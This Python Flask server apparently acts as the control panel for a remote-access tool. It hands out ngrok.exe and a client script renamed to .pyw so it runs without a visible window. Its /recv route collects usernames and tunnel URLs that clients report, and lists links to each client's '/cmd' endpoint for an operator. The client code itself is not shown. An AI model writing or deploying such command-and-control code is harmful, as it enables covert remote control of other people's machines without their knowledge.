from flask import Flask, render_template, request, send_file
import bs4
import json

requirements = 'flask werkzeug requests bs4 pyautogui pyfiglet'

URL = {}
try:
    with open('urls.json', 'r') as f:
        URL = json.load(f)
except Exception as e:
    pass

app = Flask(__name__)


@app.route('/')
def my_form():
    return render_template('cool.html')

@app.route('/code', methods=['GET', 'POST'])
def rendercode():
    return render_template('code.html')

@app.route('/ngrok', methods=['GET', 'POST'])
def downloadngrok():
    return send_file('/home/OpenBlue/mysite/ngrok.exe', as_attachment=True, attachment_filename='ngrok.exe')

@app.route('/ico', methods=['GET', 'POST'])
def downloadico():
    return send_file('/home/OpenBlue/mysite/static/favicon.ico', as_attachment=True, attachment_filename='favicon.ico')

@app.route('/back', methods=['GET', 'POST'])
def downloadback():
    return send_file('/home/OpenBlue/mysite/static/1.png', as_attachment=True, attachment_filename='1.png')

@app.route('/client', methods=['POST', 'GET'])
def client():
    return send_file('/home/OpenBlue/client.py', as_attachment=True, attachment_filename='client.pyw')

@app.route('/recv', methods=['POST', 'GET'])
def recv():
    if request.method == 'POST':
        url = request.form['recv'].split('==>')
        username = url[0]
        category = url[1].split("<>")[1]
        url = url[1].split("<>")[0]
        if category == 'P':
            url = [url, "P"]
        else:
            url = [url, "G"]
        URL[username] = url
        url = ''''''
        for user, link in URL.items():
            url += f'{user}: {link[0]}<br>'
        with open('urls.json', 'w') as f:
            json.dump(URL, f)
    if request.method == 'GET':
        if len(URL) == 0:
            return render_template('results.html')
        else:
            url = ''''''
        with open('/home/OpenBlue/mysite/templates/results.html', 'r') as f:
            soup = bs4.BeautifulSoup(''.join(f.readlines()))
        h1 = soup.find('h1', {'id': "no"})
        list_ = soup.find('ol', {'id': "list"})
        priv_list = soup.find('ol', {'id': "priv"})
        h1["hidden"] = ''
        for user, link in URL.items():
            new_link = soup.new_tag('li')
            new_link.string = f"{user}:"
            new_tag = soup.new_tag('a')
            new_tag["href"] = link[0] + '/cmd'
            new_tag["style"] = "display: inline;"
            new_tag["target"] = "_blank"
            new_tag.string = f' {link[0]}/cmd'
            new_link.append(new_tag)
            if link[1] == 'G':
                list_.append(new_link)
            else:
                priv_list.append(new_link)
            #url += f'{user}: <a href={link}>{link}</a>'
        return str(soup.prettify())
    return url


if __name__ == "__main__":
    app.run(host='0.0.0.0')
